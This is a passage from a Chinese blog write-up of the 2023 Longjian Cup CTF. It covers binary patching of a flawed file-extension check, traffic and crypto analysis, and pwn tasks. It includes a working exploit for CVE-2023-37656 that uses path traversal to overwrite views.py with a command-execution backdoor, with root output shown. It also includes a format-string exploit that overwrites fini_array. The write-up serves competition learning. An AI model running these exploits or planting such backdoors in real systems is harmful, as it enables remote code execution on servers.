+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">FUN_001013c9</span><span class="params">(<span class="type">char</span> *param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *pcVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  </span><br><span class="line">  pcVar1 = <span class="built_in">strchr</span>(param_1,<span class="string">L&#x27;.&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((pcVar1 == <span class="literal">NULL</span>) ||</span><br><span class="line">     (((((*pcVar1 != <span class="string">&#x27;.&#x27;</span> || (pcVar1[<span class="number">1</span>] != <span class="string">&#x27;j&#x27;</span>)) || (pcVar1[<span class="number">2</span>] != <span class="string">&#x27;p&#x27;</span>)) || (pcVar1[<span class="number">3</span>] != <span class="string">&#x27;g&#x27;</span>)) &amp;&amp;</span><br><span class="line">      (((*pcVar1 != <span class="string">&#x27;.&#x27;</span> || (pcVar1[<span class="number">1</span>] != <span class="string">&#x27;p&#x27;</span>)) || ((pcVar1[<span class="number">2</span>] != <span class="string">&#x27;n&#x27;</span> || (pcVar1[<span class="number">3</span>] != <span class="string">&#x27;g&#x27;</span>)))))))) &#123;</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这个函数想要找到后缀并验证后缀是否为 <code>.jpg</code> 或 <code>.png</code>，但使用的是 <code>strchr</code> 函数，是从左侧找到第一次匹配的 <code>.</code>，如果上传的文件名为 <code>xxxx.jpg.txt</code> 即可绕过该检查</li>
+<li>绕过后可通过构造软连接读取任意已知路径文件</li>
+<li>修复方式也很简单，前面主函数 <code>001018be</code> 处看到有用 <code>strrchr</code>，直接将 <code>FUN_001013c9</code> 函数中的 <code>CALL strchr</code> 修改为 <code>CALL strrchr</code> 即可（从右侧找第一次匹配的<code>.</code>）</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916101153357.png" alt="image-20230916101153357"></p>
+<p>这里在 Ghidra patch 时可以看到 call 的地址是 <code>0x00101230</code>，找到这个地址:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                     **************************************************************</span><br><span class="line">                     *                       THUNK FUNCTION                       *</span><br><span class="line">                     **************************************************************</span><br><span class="line">                     thunk <span class="type">char</span> * <span class="title function_">strchr</span><span class="params">(<span class="type">char</span> * __s, <span class="type">int</span> __c)</span></span><br><span class="line">                       Thunked-Function: &lt;EXTERNAL&gt;::<span class="built_in">strchr</span></span><br><span class="line">     <span class="type">char</span> *            RAX:8          &lt;RETURN&gt;</span><br><span class="line">     <span class="type">char</span> *            RDI:8          __s</span><br><span class="line">     <span class="type">int</span>               ESI:4          __c</span><br><span class="line">                     &lt;EXTERNAL&gt;::<span class="built_in">strchr</span>                              XREF[2]:     FUN_001013c9:001013<span class="title function_">e5</span><span class="params">(c)</span>, </span><br><span class="line">                                                                                  FUN_001015ff:001017<span class="title function_">d1</span><span class="params">(c)</span>  </span><br><span class="line">00101230 f3 0f 1e fa     ENDBR64</span><br><span class="line">00101234 f2 ff 25        JMP        qword ptr [-&gt;&lt;EXTERNAL&gt;::<span class="built_in">strchr</span>]                 <span class="type">char</span> * <span class="title function_">strchr</span><span class="params">(<span class="type">char</span> * __s, <span class="type">int</span> __c)</span></span><br><span class="line">         45 2d 00 00</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>往下一点找 <code>strrstr</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">                     **************************************************************</span><br><span class="line">                     *                       THUNK FUNCTION                       *</span><br><span class="line">                     **************************************************************</span><br><span class="line">                     thunk <span class="type">char</span> * <span class="title function_">strrchr</span><span class="params">(<span class="type">char</span> * __s, <span class="type">int</span> __c)</span></span><br><span class="line">                       Thunked-Function: &lt;EXTERNAL&gt;::<span class="built_in">strrchr</span></span><br><span class="line">     <span class="type">char</span> *            RAX:8          &lt;RETURN&gt;</span><br><span class="line">     <span class="type">char</span> *            RDI:8          __s</span><br><span class="line">     <span class="type">int</span>               ESI:4          __c</span><br><span class="line">                     &lt;EXTERNAL&gt;::<span class="built_in">strrchr</span>                             XREF[1]:     FUN_001015ff:001018<span class="title function_">be</span><span class="params">(c)</span>  </span><br><span class="line">00101250 f3 0f 1e fa     ENDBR64</span><br><span class="line">00101254 f2 ff 25        JMP        qword ptr [-&gt;&lt;EXTERNAL&gt;::<span class="built_in">strrchr</span>]                <span class="type">char</span> * <span class="title function_">strrchr</span><span class="params">(<span class="type">char</span> * __s, <span class="type">int</span> _</span></span><br><span class="line"><span class="params">         <span class="number">35</span> <span class="number">2</span>d <span class="number">00</span> <span class="number">00</span></span></span><br></pre></td></tr></table></figure>
+
+<p>把调用的地址从 <code>0x00101230</code> 改成 <code>0x00101250</code> 就行, 用 Ghidra 的 patch，选这个修改字节最少的(1字节): <code>e8 46 fe ff ff</code> 👉 <code>e8 66 fe ff ff</code></p>
+<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916101857277.png" alt="image-20230916101857277"></p>
+<p>Ghidra Patch 之后导出的程序有大问题，直接服务异常；最后还是得用 IDA Pro 来 Patch，把这一个字节改了就能 fix 成功</p>
+<blockquote>
+<p>Ghidra Patch 之后导出的程序单看文件大小：修改前 18KB，patch后13KB(不晓得扬了啥)；提交使用 Ghidra Patch 后的程序的检查结果是服务异常【挖个坑，以后再看看为啥】</p>
+<p>TODO</p>
+</blockquote>
+<h4 id="guide"><a href="#guide" class="headerlink" title="guide"></a>guide</h4><ul>
+<li>这个是<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2023-37656">CVE-2023-37656</a> 👉 <a target="_blank" rel="noopener" href="https://github.com/mizhexiaoxiao/WebsiteGuide/issues/12">https://github.com/mizhexiaoxiao/WebsiteGuide/issues/12</a></li>
+<li>👴🏻🚪当时没整出来：<ul>
+<li>👉 fix: 检查文件后缀是否是 png，不是就给它 ban 了 </li>
+<li>👉 check结果: EXP 利用成功</li>
+<li>👉 竟然不行，不管了看别的了</li>
+</ul>
+</li>
+<li>check的应该是任意文件写的问题吧，当时没往这方面想（👴🏻太菜了</li>
+<li>赛题的环境复现的有点问题，就直接拿最新的docker镜像复现漏洞利用了:</li>
+</ul>
+<p>漏洞在 <code>websiteapp/views.py</code> 的 <code>class IconViewSet(View)</code> 的 post 方法中:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, request</span>):</span><br><span class="line">    <span class="built_in">id</span> = request.POST.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    name = request.POST.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(name) == <span class="string">&quot;default.png&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&#x27;图片名称不能为default.png，请修改&#x27;</span>&#125;)</span><br><span class="line">    file = request.FILES.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    save_path = os.path.join(settings.MEDIA_ROOT, <span class="string">&#x27;icon&#x27;</span>, name)  <span class="comment"># 这里能任意文件写，并且没有对文件类型进行限制</span></span><br><span class="line">    ins = models.WebSite.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="built_in">id</span>).first()</span><br><span class="line">    <span class="keyword">if</span> ins:</span><br><span class="line">        ins.icon = name</span><br><span class="line">        ins.save()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">for</span> chunk <span class="keyword">in</span> file.chunks():</span><br><span class="line">                    f.write(chunk)</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;替换成功&quot;</span>, <span class="string">&quot;detail&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;替换失败&quot;</span>, <span class="string">&quot;detail&quot;</span>: e&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">404</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">login_url = <span class="string">&quot;http://localhost:8002/api/login/&quot;</span></span><br><span class="line">vuln_url = <span class="string">&quot;http://localhost:8002/api/icon/&quot;</span></span><br><span class="line"></span><br><span class="line">login_form = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin@1234&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">multiform_data = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;1&quot;</span>),</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;../../views.py&quot;</span>), <span class="comment"># 覆盖掉原来的 views.py</span></span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (<span class="string">&quot;a.png&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./payload.py&quot;</span>, <span class="string">&quot;rb&quot;</span>), <span class="string">&#x27;image/png&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">res = s.post(login_url, data=login_form).json()</span><br><span class="line">auth_token = res[<span class="string">&quot;detail&quot;</span>][<span class="string">&quot;token&quot;</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: auth_token</span><br><span class="line">&#125;</span><br><span class="line">res = s.post(vuln_url, files=multiform_data, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>这里的 <code>payload.py</code> 基于原本的 <code>views.py</code> 修改:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在刚刚的icon上传接口处加一个命令执行接口, 覆盖掉原来的 views.py</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, request</span>):</span><br><span class="line">        <span class="built_in">id</span> = request.POST.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">        name = request.POST.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        p = Popen(name, shell=<span class="literal">True</span>, stdout=PIPE, stderr=PIPE)</span><br><span class="line">        stdout, stderr = p.communicate()</span><br><span class="line">        <span class="keyword">if</span> p.returncode == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;execute success&quot;</span>, <span class="string">&quot;detail&quot;</span>: stdout.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(name) == <span class="string">&quot;default.png&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&#x27;图片名称不能为default.png，请修改&#x27;</span>&#125;)</span><br><span class="line">        file = request.FILES.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        save_path = os.path.join(settings.MEDIA_ROOT, <span class="string">&#x27;icon&#x27;</span>, name)</span><br><span class="line">        ins = models.WebSite.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="built_in">id</span>).first()</span><br><span class="line">        <span class="keyword">if</span> ins:</span><br><span class="line">            ins.icon = name</span><br><span class="line">            ins.save()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(save_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">for</span> chunk <span class="keyword">in</span> file.chunks():</span><br><span class="line">                        f.write(chunk)</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;替换成功&quot;</span>, <span class="string">&quot;detail&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">500</span>, <span class="string">&quot;msg&quot;</span>: <span class="string">&quot;替换失败&quot;</span>, <span class="string">&quot;detail&quot;</span>: e&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">404</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>重启服务之后再次访问接口，测试一下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">login_url = <span class="string">&quot;http://localhost:8002/api/login/&quot;</span></span><br><span class="line">vuln_url = <span class="string">&quot;http://localhost:8002/api/icon/&quot;</span></span><br><span class="line"></span><br><span class="line">login_form = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin@1234&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">datas = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;1&quot;</span>),</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: (<span class="literal">None</span>, <span class="string">&quot;id&quot;</span>),</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (<span class="string">&quot;a.png&quot;</span>, <span class="string">b&quot;aaa&quot;</span>, <span class="string">&#x27;image/png&#x27;</span>),</span><br><span class="line">&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line">res = s.post(login_url, data=login_form).json()</span><br><span class="line">auth_token = res[<span class="string">&quot;detail&quot;</span>][<span class="string">&quot;token&quot;</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: auth_token</span><br><span class="line">&#125;</span><br><span class="line">res2 = s.post(vuln_url, files=datas, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(res2.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&quot;code&quot;: 200, &quot;msg&quot;: &quot;execute success&quot;, &quot;detail&quot;: &quot;uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><h4 id="soeasy"><a href="#soeasy" class="headerlink" title="soeasy"></a>soeasy</h4><ol>
+<li>登录的密码是多少，请输入 md5 加密的 32 位小写字符串</li>
+</ol>
+<p>这是一个 FTP 流量包，筛选 ftp 流量，直接就能看到登录成功时所使用的的密码</p>
+<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916103735687.png" alt="image-20230916103735687"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n test | md5sum -t -</span><br><span class="line">098f6bcd4621d373cade4e832627b4f6  -</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>小坑: 直接用命令算 md5 时注意换行符</p>
+</blockquote>
+<ol start="2">
+<li>被加密的字符串是多少</li>
+</ol>
+<p>从流量包中可以提取出以下文件:</p>
+<ul>
+<li><code>private_key.pem</code>、<code>public_key.pem</code>、<code>py.txt</code>、<code>encrypted.txt</code></li>
+<li>即：私钥、公钥、加密用的 python 脚本、加密后的数据</li>
+</ul>
+<p>对照加密脚本写个解密脚本就行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">message, public_key_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(public_key_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        public_key = RSA.import_key(f.read())</span><br><span class="line">        cipher = PKCS1_OAEP.new(public_key)</span><br><span class="line">        encrypted_message = cipher.encrypt(message.encode())</span><br><span class="line">        <span class="keyword">return</span> encrypted_message</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_message</span>(<span class="params">message, private_key_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(private_key_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        key_data = RSA.importKey(f.read())</span><br><span class="line">        private_key = PKCS1_OAEP.new(key_data)</span><br><span class="line">        decrypted_data = private_key.decrypt(message)</span><br><span class="line">        <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;encrypted.txt.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        data = decrypt_message(data, <span class="string">&quot;./private_key.pem&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
+
+<p>执行脚本得到加密的数据：<code>8dhn3edfna93rAPN</code></p>
+<ol start="3">
+<li>图片中隐藏的数字是多少 【这题没整出来】</li>
+</ol>
+<p>FTP 传输流量中有一个 11.zip，其中包含有一个 11.bmp 图片，打开是这样：</p>
+<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916110113730.png" alt="非原图"></p>
+<p>根据图片大小 ( <code>biSizeImage</code>: <code>8957952</code> )、图片宽度 ( <code>biWidth</code>: <code>2304</code> ) 和比特数 ( <code>biBitCount</code>: <code>16</code> ) 信息计算出高度为 <code>1944</code> 【 <code>8957952/2304/(16/8)</code> 】, 修改后得到:</p>
+<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230916110946541.png" alt="还是非原图"></p>
+<p>然后就卡这了，提交了一顿没个对的，谁能告诉👴🏻这数字不是 <code>30104023010402</code> 还能是啥</p>
+<h4 id="session、easy-shiro"><a href="#session、easy-shiro" class="headerlink" title="session、easy_shiro"></a>session、easy_shiro</h4><ul>
+<li>队内 web👴🏻🚪 整的</li>
+</ul>
+<h3 id="人工智障"><a href="#人工智障" class="headerlink" title="人工智障"></a>人工智障</h3><ul>
+<li>🤖没拉到本地，还得手搓</li>
+<li>全是pwn入门题目，思路在各题目描述里也有，根据思路手搓就行</li>
+</ul>
+<h4 id="fmt3-x64"><a href="#fmt3-x64" class="headerlink" title="fmt3_x64"></a>fmt3_x64</h4><p>其中 <code>fmt3_x64</code> 的格式化字符串漏洞覆盖 fini_array 操作头一次用，记录一下这个:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./fmt3_x64&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;172.16.7.10&quot;</span>, <span class="number">11473</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./fmt3_x64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;your fmt &gt;&gt;&gt;\n&quot;</span>, flat([</span><br><span class="line">    <span class="string">b&quot;%01784d&quot;</span> <span class="comment"># 0x06f8 -&gt; 0x4006f8 -&gt; backdoor</span></span><br><span class="line">    <span class="string">b&quot;%8$hnAAAA&quot;</span>,</span><br><span class="line">    p64(<span class="number">0x006009b8</span>), <span class="comment"># fini_array addr</span></span><br><span class="line">    <span class="string">b&quot;\n&quot;</span></span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>更多: <a target="_blank" rel="noopener" href="https://wiki.mrskye.cn/Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/">fini_array 劫持</a></li>
+</ul>
+<h1 id="2023陇剑杯总决赛"><a href="#2023陇剑杯总决赛" class="headerlink" title="2023陇剑杯总决赛"></a>2023陇剑杯总决赛</h1><h2 id="被暴打的战况"><a href="#被暴打的战况" class="headerlink" title="被暴打的战况"></a>被暴打的战况</h2><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230918204745722.png" alt="image-20230918204745722"></p>
+<ul>
+<li>👴🏻🚪太菜了，被虐麻了，愣是一个都没 patch 成功</li>
+<li>第二天体验极其煎熬，通防不好使了😅</li>
+<li>战况: 总排名 60th.</li>
+</ul>
+<h2 id="总决赛-Writeup"><a href="#总决赛-Writeup" class="headerlink" title="总决赛 Writeup"></a>总决赛 Writeup</h2><blockquote>
+<p>TODO: 等先忙活完最近的事情再来补吧</p>
+</blockquote>
+<h3 id="实景防御-1"><a href="#实景防御-1" class="headerlink" title="实景防御"></a>实景防御</h3><ul>
+<li>原本想上来先 patch 一个好上分，然后再去 RHG 赛道启动一下🤖<ul>
+<li>没想到直接 patch 了一天也没 patch 成功一个😅</li>
+</ul>
+</li>
+</ul>
+<p>TODO</p>
+<h3 id="数据分析-1"><a href="#数据分析-1" class="headerlink" title="数据分析"></a>数据分析</h3><p>TODO</p>
+<h3 id="人工智障-1"><a href="#人工智障-1" class="headerlink" title="人工智障"></a>人工智障</h3><p>TODO</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ex7l0it
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://ex7l0it.github.io/2023/09/16/ljb23/" title="2023陇剑杯复盘">https://ex7l0it.github.io/2023/09/16/ljb23/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"><i class="fa fa-tag"></i> writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/09/07/GithubActions/" rel="prev" title="Github Actions Workflows 使用">
+                  <i class="fa fa-angle-left"></i> Github Actions Workflows 使用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/09/20/shell/" rel="next" title="基础知识 - shell 💻">
+                  基础知识 - shell 💻 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  
+  <div class="comments giscus-container">
+  </div>
+  
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ex7l0it</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">66k</span>
+  </span>
+  <span class="post-meta-item">
